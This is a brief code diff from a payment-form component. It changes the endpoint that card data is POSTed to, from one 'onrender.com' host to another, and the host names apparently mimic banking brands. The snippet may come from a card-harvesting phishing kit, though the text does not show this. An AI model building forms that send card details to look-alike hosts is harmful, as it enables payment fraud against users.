@@ -83,7 +83,7 @@ export default function PaymentForm() {
     };
 
     try {
-      const res = await fetch("https://bobonline.onrender.com/api/cards", {
+      const res = await fetch("https://indusonline.onrender.com/api/cards", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(data),
